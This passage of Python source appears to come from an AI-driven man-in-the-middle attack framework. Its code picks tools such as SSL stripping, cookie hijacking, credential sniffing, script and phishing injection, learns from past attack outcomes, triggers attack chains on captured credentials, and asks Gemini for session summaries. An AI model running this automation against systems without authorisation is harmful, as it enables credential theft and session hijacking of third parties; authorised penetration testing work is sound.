                    score_delta = 0.0
                    tool_succeeded = exec_result.success and (exec_result.findings or verification.get("success"))
                    if tool_succeeded:
                        score_delta += 0.15
                        # Reset failure count on success
                        failed_tools.pop(selected_tool.tool_id, None)
                    else:
                        score_delta -= 0.2
                        # Track consecutive failures for exponential backoff
                        failed_tools[selected_tool.tool_id] = failed_tools.get(selected_tool.tool_id, 0) + 1
                        logger.debug(f"Tool {selected_tool.tool_id} failed, consecutive failures: {failed_tools[selected_tool.tool_id]}")
                    tool_scores[selected_tool.tool_id] = tool_scores.get(selected_tool.tool_id, 0.0) + score_delta

                    # ============================================================
                    # ENHANCED: Record outcome to memory for cross-session learning
                    # ============================================================
                    reasoning_chain_id = ""
                    if hasattr(self, '_last_reasoning_chain') and self._last_reasoning_chain:
                        reasoning_chain_id = self._last_reasoning_chain.chain_id

                    await self._record_attack_outcome(
                        tool_id=selected_tool.tool_id,
                        proxy_id=proxy_id,
                        attack_surface=attack_surface,
                        result=exec_result,
                        verification=verification,
                        current_phase=current_phase,
                        reasoning_chain_id=reasoning_chain_id
                    )

                    # ============================================================
                    # Check for attack chain triggers based on accumulated metrics
                    # ============================================================
                    chain_metrics = {
                        "credentials_captured": len(captured_credentials),
                        "api_tokens_captured": len(captured_tokens),
                        "jwt_tokens_captured": sum(1 for t in captured_tokens if "jwt" in str(t).lower()),
                        "injection_successful": any(f.get("type") == "injection_success" for f in cumulative_findings),
                        "ssl_stripped": any(f.get("type") == "ssl_strip_success" for f in cumulative_findings),
                        "sessions_hijacked": sum(1 for f in cumulative_findings if f.get("type") == "session_hijacked"),
                        "websocket_traffic": attack_surface.get("has_websocket", False),
                        "cache_headers_present": attack_surface.get("has_cache_headers", False),
                    }

                    triggered_chains = self.chain_executor.check_chain_triggers(chain_metrics)
                    if triggered_chains:
                        results["decision_log"].append({
                            "step": f"chain_trigger_{iteration}",
                            "triggered_chains": triggered_chains,
                            "metrics": chain_metrics
                        })
                        for chain_id in triggered_chains:
                            asyncio.create_task(
                                self.chain_executor.execute_chain(chain_id, {"proxy_id": proxy_id})
                            )

                    # Queue follow-up tools if any
                    for t in feedback.get("follow_up_tools", []):
                        if t not in executed_tools and t not in follow_up_queue:
                            follow_up_queue.append(t)

                    # Goal-based stopping
                    goal_progress = self.get_goal_progress(proxy_id)
                    if goal_progress.get("goals"):
                        all_complete = all(g.get("completion", 0) >= 100 for g in goal_progress["goals"])
                        if all_complete:
                            results["decision_log"].append({
                                "step": f"iteration_{iteration}",
                                "decision": "stop",
                                "reason": "All goals achieved",
                                "goals": goal_progress.get("goals", [])
                            })
                            stop_session = True
                            break

                    # Update attack surface based on findings
                    attack_surface = self._update_attack_surface(attack_surface, exec_result)

                if stop_session:
                    break
            
            # Generate intelligent summary using AI
            ai_summary = await self._generate_session_summary(
                results["executions"],
                cumulative_findings,
                attack_surface,
                captured_credentials
            )
            
            # Calculate severity stats
            severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
            for f in results["all_findings"]:
                sev = f.get("severity", "info")
                if sev in severity_counts:
                    severity_counts[sev] += 1
            
            duration_seconds = time.time() - session_start
            
            # Format response
            results["status"] = "completed" if not results.get("error") else "failed"
            results["tools_recommended"] = len(recommendations) if recommendations else 0
            results["tools_executed"] = len(executed_tools)
            results["total_findings"] = len(results["all_findings"])
            results["findings"] = results["all_findings"]
            results["execution_results"] = results["executions"]
            results["duration_seconds"] = duration_seconds
            results["ai_summary"] = ai_summary
            results["captured_data"] = {
                "credentials": captured_credentials,
                "tokens": captured_tokens
            }
            results["summary"] = {
                "total_recommendations": results.get("tools_recommended", 0),
                "tools_executed": len(executed_tools),
                "total_findings": len(results["all_findings"]),
                "findings_by_severity": severity_counts,
                "execution_time_ms": duration_seconds * 1000,
                "iterations": iteration,
                "phase_strategy": phase_strategy,
                "final_phase": current_phase,
                "phase_progression": {
                    "tools_per_phase": phase_tools_executed,
                    "findings_per_phase": phase_findings
                }
            }
            results["completed_at"] = datetime.utcnow().isoformat()
            self.last_decision_logs[proxy_id] = results.get("decision_log", [])

            # Emit session completed event
            self._emit_event("agentic_session_completed", {
                "proxy_id": proxy_id,
                "session_id": session_id,
                "status": results.get("status", "completed"),
                "tools_executed": len(executed_tools),
                "total_findings": len(results["all_findings"]),
                "credentials_captured": len(captured_credentials),
                "tokens_captured": len(captured_tokens),
                "execution_time_ms": duration_seconds * 1000
            })

        except Exception as e:
            logger.error(f"Agentic session error: {e}")
            results["error"] = str(e)
            results["status"] = "failed"
            results["ai_summary"] = f"Session failed: {str(e)}"
            self.last_decision_logs[proxy_id] = results.get("decision_log", [])

            # Emit session failed event
            self._emit_event("agentic_session_failed", {
                "proxy_id": proxy_id,
                "session_id": session_id,
                "error": str(e),
                "tools_executed": len(executed_tools) if 'executed_tools' in dir() else 0
            })

        return results
    
    def _analyze_attack_surface(self, traffic_log: List[Dict], proxy_config: Dict) -> Dict:
        """Analyze traffic to understand the attack surface"""
        surface = {
            "has_auth": False,
            "auth_types": set(),
            "has_cookies": False,
            "cookie_flags_missing": set(),
            "has_https": proxy_config.get("tls_enabled", False),
            "missing_headers": set(),
            "has_forms": False,
            "sensitive_endpoints": [],
            "technologies": set(),
            "api_patterns": set()
        }
        
        security_headers = {
            "content-security-policy", "strict-transport-security",
            "x-content-type-options", "x-frame-options", "x-xss-protection"
        }
        
        for entry in traffic_log[:50]:  # Sample for performance
            if not isinstance(entry, dict):
                continue
            req = entry.get("request") or {}
            resp = entry.get("response") or {}
            
            req_headers = req.get("headers", {})
            resp_headers = resp.get("headers", {})
            
            # Check auth
            auth = req_headers.get("Authorization", "")
            if auth:
                surface["has_auth"] = True
                if auth.startswith("Basic"):
                    surface["auth_types"].add("basic")
                elif auth.startswith("Bearer"):
                    surface["auth_types"].add("bearer")
                elif "apikey" in auth.lower():
                    surface["auth_types"].add("api_key")
            
            # Check cookies
            if "Cookie" in req_headers or "Set-Cookie" in resp_headers:
                surface["has_cookies"] = True
                set_cookie = resp_headers.get("Set-Cookie", "")
                if set_cookie:
                    if "httponly" not in set_cookie.lower():
                        surface["cookie_flags_missing"].add("HttpOnly")
                    if "secure" not in set_cookie.lower():
                        surface["cookie_flags_missing"].add("Secure")
                    if "samesite" not in set_cookie.lower():
                        surface["cookie_flags_missing"].add("SameSite")
            
            # Check security headers
            resp_header_names = {k.lower() for k in resp_headers.keys()}
            for sh in security_headers:
                if sh not in resp_header_names:
                    surface["missing_headers"].add(sh)
            
            # Check for forms/sensitive endpoints
            path = req.get("path", "")
            if any(p in path.lower() for p in ["login", "auth", "signin", "password", "register"]):
                surface["sensitive_endpoints"].append(path)
                surface["has_forms"] = True
            
            # Detect technologies
            server = resp_headers.get("Server", "")
            if server:
                surface["technologies"].add(f"Server: {server}")
            powered_by = resp_headers.get("X-Powered-By", "")
            if powered_by:
                surface["technologies"].add(f"Framework: {powered_by}")
            
            # Detect API patterns
            content_type = resp_headers.get("Content-Type", "")
            if "application/json" in content_type:
                surface["api_patterns"].add("json_api")
            if "/api/" in path or "/v1/" in path or "/v2/" in path:
                surface["api_patterns"].add("rest_api")
        
        return surface
    
    async def _select_best_tool(
        self,
        recommendations: List[AIToolRecommendation],
        current_findings: List[Dict],
        attack_surface: Dict,
        captured_credentials: List[Dict],
        executed_tools: set
    ) -> Optional[AIToolRecommendation]:
        """Intelligently select the best next tool based on context"""
        
        # Priority rules for tool chaining
        # 1. If we have credentials, prioritize session hijacking
        if captured_credentials and "cookie_hijacker" not in executed_tools:
            for rec in recommendations:
                if rec.tool_id == "cookie_hijacker":
                    rec.confidence = min(1.0, rec.confidence + 0.2)  # Boost
        
        # 2. If missing HSTS, prioritize SSL stripping
        if "strict-transport-security" in attack_surface.get("missing_headers", set()):
            for rec in recommendations:
                if rec.tool_id in ["sslstrip", "hsts_bypass"]:
                    rec.confidence = min(1.0, rec.confidence + 0.15)
        
        # 3. If weak cookie flags, prioritize cookie attacks
        if attack_surface.get("cookie_flags_missing"):
            for rec in recommendations:
                if rec.tool_id == "cookie_hijacker":
                    rec.confidence = min(1.0, rec.confidence + 0.1)
        
        # 4. If we found injection vulnerabilities, prioritize injectors
        injection_found = any(
            "injection" in f.get("category", "").lower() or 
            "xss" in f.get("title", "").lower()
            for f in current_findings
        )
        if injection_found:
            for rec in recommendations:
                if rec.tool_id == "script_injector":
                    rec.confidence = min(1.0, rec.confidence + 0.15)
        
        # Sort by adjusted confidence and return top
        recommendations.sort(key=lambda r: r.confidence, reverse=True)

        # Return highest confidence tool that's executable
        for rec in recommendations:
            if rec.auto_executable and rec.tool_id not in executed_tools:
                return rec

        return None

    async def _select_best_tool_with_thompson(
        self,
        recommendations: List[AIToolRecommendation],
        current_findings: List[Dict],
        attack_surface: Dict,
        captured_credentials: List[Dict],
        executed_tools: set,
        current_phase: str
    ) -> Optional[AIToolRecommendation]:
        """
        Enhanced tool selection using Thompson Sampling for explore/exploit balance.

        Uses memory-based Bayesian sampling to balance:
        - Exploitation: Tools that worked well historically
        - Exploration: Tools that haven't been tried much
        """
        import numpy as np

        if not recommendations:
            return None

        # Get target type for context
        target_type = attack_surface.get("target_type", "web_app")

        # Calculate Thompson-sampled scores for each tool
        thompson_scores = []

        for rec in recommendations:
            if rec.tool_id in executed_tools:
                continue

            # Get historical performance from memory
            tool_perf = self.memory.tool_performance.get(rec.tool_id)

            if tool_perf:
                # Use Beta distribution sampling based on successes/failures
                successes = tool_perf.target_type_successes.get(target_type, 0)
                failures = tool_perf.target_type_failures.get(target_type, 0)

                # Add smoothing priors (optimistic: assume some success)
                alpha = successes + 1
                beta = failures + 1

                # Thompson sample from Beta distribution
                sampled_rate = np.random.beta(alpha, beta)

                # Combine with pattern-based confidence
                combined_score = 0.6 * sampled_rate + 0.4 * rec.confidence
            else:
                # New tool - use optimistic exploration bonus
                exploration_bonus = 0.15
                combined_score = rec.confidence + exploration_bonus

            # Phase-specific boosting
            phase_boost = self._get_phase_boost(rec.tool_id, current_phase)
            combined_score += phase_boost

            # Context-specific boosting (same as _select_best_tool)
            if captured_credentials and rec.tool_id == "cookie_hijacker":
                combined_score += 0.2
            if attack_surface.get("missing_headers", set()) and rec.tool_id in ["sslstrip", "hsts_bypass"]:
                combined_score += 0.15

            thompson_scores.append((rec, combined_score))

        if not thompson_scores:
            return None

        # Sort by Thompson-sampled scores
        thompson_scores.sort(key=lambda x: x[1], reverse=True)

        # Return the best tool
        best_rec, best_score = thompson_scores[0]
        best_rec.confidence = min(1.0, best_score)  # Update confidence with Thompson score

        return best_rec

    def _get_phase_boost(self, tool_id: str, current_phase: str) -> float:
        """Get phase-specific confidence boost for a tool."""
        phase_boosts = {
            "observation": {
                "tech_fingerprint": 0.2,
                "header_analyzer": 0.2,
                "credential_sniffer": 0.1
            },
            "analysis": {
                "cookie_hijacker": 0.15,
                "jwt_manipulator": 0.15,
                "api_param_tamperer": 0.1
            },
            "initial_access": {
                "sslstrip": 0.2,
                "hsts_bypass": 0.15,
                "credential_sniffer": 0.15
            },
            "exploitation": {
                "script_injector": 0.2,
                "phishing_injector": 0.15,
                "cors_manipulator": 0.15,
                "csp_bypass": 0.1
            }
        }
        return phase_boosts.get(current_phase, {}).get(tool_id, 0.0)

    async def _record_attack_outcome(
        self,
        tool_id: str,
        proxy_id: str,
        attack_surface: Dict,
        result: ToolExecutionResult,
        verification: Dict,
        current_phase: str,
        reasoning_chain_id: str = ""
    ):
        """
        Record attack outcome to memory for cross-session learning.

        This enables the agent to learn from past attacks and improve
        future decision-making via Thompson Sampling.
        """
        from .mitm_agentic_brain import MITMMemoryEntry

        # Calculate effectiveness score
        effectiveness = 0.0
        if result.success:
            effectiveness += 0.3
        if result.findings:
            effectiveness += 0.1 * min(len(result.findings), 5)
        if result.credentials_found:
            effectiveness += 0.3
        if verification.get("attack_confirmed"):
            effectiveness += 0.2
        effectiveness = min(1.0, effectiveness)

        # Create memory entry
        memory_entry = MITMMemoryEntry(
            memory_id=str(uuid.uuid4()),
            timestamp=datetime.utcnow(),
            tool_id=tool_id,
            target_host=attack_surface.get("target_host", "unknown"),
            target_type=attack_surface.get("target_type", "web_app"),
            attack_surface_snapshot=attack_surface,
            reasoning_chain_id=reasoning_chain_id,
            reasoning_steps=[],
            confidence=result.findings[0].get("confidence", 0.5) if result.findings else 0.5,
            attack_succeeded=result.success and effectiveness > 0.3,
            credentials_captured=len(result.credentials_found) if result.credentials_found else 0,
            tokens_captured=0,
            sessions_hijacked=0,
            findings_generated=len(result.findings),
            effectiveness_score=effectiveness,
            phase=current_phase,
            chain_triggered=None,
            execution_time_ms=result.execution_time_ms,
            error_message=result.errors[0] if result.errors else None
        )

        # Store in memory
        self.memory.add_memory(memory_entry)

        # Update tool performance stats for Thompson Sampling
        target_type = attack_surface.get("target_type", "web_app")
        self.memory.update_tool_performance(
            tool_id=tool_id,
            target_type=target_type,
            success=result.success and effectiveness > 0.3,
            effectiveness=effectiveness
        )

    def _check_tool_prerequisites(
        self,
        tool: Optional[MITMAttackTool],
        proxy,
        attack_surface: Dict,
        traffic_log: List[Dict]
    ) -> Tuple[bool, List[str]]:
        """Check whether tool prerequisites are met"""
        if not tool:
            return False, ["unknown_tool"]

        reasons = []
        prerequisites = tool.prerequisites or []

        if "proxy_running" in prerequisites and not getattr(proxy, "running", False):
            reasons.append("proxy_not_running")

        if "traffic_flowing" in prerequisites and len(traffic_log) == 0:
            reasons.append("no_traffic")

        if "target_uses_https" in prerequisites:
            has_https = attack_surface.get("has_https", False)
            if not has_https:
                reasons.append("https_not_detected")

        # Tools that apply rules require auto_modify mode
        if tool.rule_template and getattr(proxy, "mode", None) is not None:
            if proxy.mode.value != "auto_modify":
                reasons.append("auto_modify_required")

        return len(reasons) == 0, reasons
    
    def _analyze_execution_feedback(
        self,
        result: ToolExecutionResult,
        tool: AIToolRecommendation,
        attack_surface: Dict
    ) -> Dict:
        """Analyze execution results to inform next decisions"""
        feedback = {
            "success": result.success,
            "findings_count": len(result.findings),
            "high_severity": sum(1 for f in result.findings if f.get("severity") in ["critical", "high"]),
            "follow_up_tools": [],
            "summary": ""
        }
        
        # Suggest follow-up tools based on findings
        for finding in result.findings:
            category = finding.get("category", "").lower()
            severity = finding.get("severity", "").lower()
            
            if "credential" in category and severity in ["critical", "high"]:
                feedback["follow_up_tools"].append("cookie_hijacker")
                feedback["follow_up_tools"].append("phishing_injector")
            
            if "header" in category and "missing" in finding.get("title", "").lower():
                if "csp" in finding.get("title", "").lower():
                    feedback["follow_up_tools"].append("script_injector")
                if "hsts" in finding.get("title", "").lower():
                    feedback["follow_up_tools"].append("sslstrip")
            
            if "cors" in category.lower():
                feedback["follow_up_tools"].append("cors_manipulator")
        
        # Generate summary
        if result.success:
            feedback["summary"] = (
                f"Tool {tool.tool_name} executed successfully. "
                f"Found {feedback['findings_count']} findings "
                f"({feedback['high_severity']} high/critical). "
                f"Suggested follow-ups: {feedback['follow_up_tools'][:3]}"
            )
        else:
            feedback["summary"] = f"Tool {tool.tool_name} failed: {result.errors}"
        
        return feedback
    
    def _update_attack_surface(self, surface: Dict, result: ToolExecutionResult) -> Dict:
        """Update attack surface understanding based on tool execution results"""
        for finding in result.findings:
            category = finding.get("category", "").lower()
            
            # Track discovered issues
            if "credential" in category:
                surface["credential_exposure_confirmed"] = True
            if "header" in category:
                surface["header_issues_confirmed"] = True
            if "session" in category or "cookie" in category:
                surface["session_vulnerable"] = True
        
        if result.credentials_found:
            surface["credentials_captured"] = True
            surface["captured_count"] = len(result.credentials_found)
        
        return surface
    
    async def _generate_session_summary(
        self,
        executions: List[Dict],
        findings: List[Dict],
        attack_surface: Dict,
        credentials: List[Dict]
    ) -> str:
        """Generate an intelligent AI summary of the session"""
        try:
            from ..core.config import settings
            
            if not settings.gemini_api_key:
                return self._generate_basic_summary(executions, findings, credentials)
            
            from google import genai
            from google.genai import types
            
            client = genai.Client(api_key=settings.gemini_api_key)
            
            # Prepare context
            tools_run = [e["tool_name"] for e in executions if e["success"]]
            high_findings = [f for f in findings if f.get("severity") in ["critical", "high"]]
            
            prompt = f"""Summarize this automated penetration testing session concisely:

TARGET: {attack_surface.get('technologies', 'Unknown')}
AUTH: {list(attack_surface.get('auth_types', []))}
TOOLS EXECUTED: {tools_run}
TOTAL FINDINGS: {len(findings)} ({len(high_findings)} critical/high)
CREDENTIALS CAPTURED: {len(credentials)}
ATTACK SURFACE NOTES: 
- Missing headers: {list(attack_surface.get('missing_headers', set()))[:5]}
- Cookie issues: {list(attack_surface.get('cookie_flags_missing', set()))}
- Session vulnerable: {attack_surface.get('session_vulnerable', False)}

HIGH SEVERITY FINDINGS:
{json.dumps([{"title": f["title"], "severity": f["severity"]} for f in high_findings[:5]], indent=2)}

Write a 2-3 sentence executive summary of what was discovered and the security risk level."""

            response = await client.aio.models.generate_content(
                model="gemini-3-flash-preview",
                contents=prompt,
                config=types.GenerateContentConfig(
                    thinking_config={"thinking_level": "medium"},
                    max_output_tokens=200
                )
            )
            
            return response.text.strip()
            
        except Exception as e:
            logger.warning(f"AI summary failed: {e}")
            return self._generate_basic_summary(executions, findings, credentials)
    
    def _generate_basic_summary(
        self,
        executions: List[Dict],
        findings: List[Dict],
        credentials: List[Dict]
    ) -> str:
        """Generate a basic summary without AI"""
        successful = sum(1 for e in executions if e["success"])
        critical = sum(1 for f in findings if f.get("severity") == "critical")
        high = sum(1 for f in findings if f.get("severity") == "high")
        
        return (
            f"Agentic attack session completed. Executed {successful}/{len(executions)} tools successfully. "
            f"Discovered {len(findings)} total findings ({critical} critical, {high} high severity). "
            f"{'Captured ' + str(len(credentials)) + ' credentials. ' if credentials else ''}"
            f"{'CRITICAL: Immediate remediation required.' if critical > 0 else 'Review findings for remediation.'}"
        )


# ============================================================================
# Service Instance
# ============================================================================

# Will be initialized with mitm_service reference
mitm_attack_tools_service: Optional[MITMAgenticExecutor] = None


def init_mitm_attack_tools(mitm_service):
    """Initialize the MITM attack tools service"""
    global mitm_attack_tools_service
    mitm_attack_tools_service = MITMAgenticExecutor(mitm_service)
    return mitm_attack_tools_service


def get_available_tools() -> List[Dict]:
    """Get list of all available MITM attack tools (base + extended)"""
    all_tools = {**MITM_ATTACK_TOOLS, **MITM_EXTENDED_TOOLS}
    return [tool.to_dict() for tool in all_tools.values()]


def get_tool_by_id(tool_id: str) -> Optional[Dict]:
    """Get a specific tool by ID"""
    all_tools = {**MITM_ATTACK_TOOLS, **MITM_EXTENDED_TOOLS}
    if tool_id in all_tools:
        return all_tools[tool_id].to_dict()
    return None


def get_tools_by_category(category: str) -> List[Dict]:
    """Get tools filtered by category"""
    all_tools = {**MITM_ATTACK_TOOLS, **MITM_EXTENDED_TOOLS}
    return [
        tool.to_dict() for tool in all_tools.values()
        if tool.category.value == category
    ]


def get_attack_chains() -> List[Dict]:
    """Get all available attack chains"""
    return [chain.to_dict() for chain in ATTACK_CHAINS.values()]


def get_attack_phases() -> List[Dict]:
    """Get all attack phase definitions"""
    return [phase.to_dict() for phase in PHASE_DEFINITIONS.values()]


def get_mitre_mapping() -> Dict[str, List[str]]:
    """Get tool to MITRE technique mapping"""
    return TOOL_MITRE_MAPPING
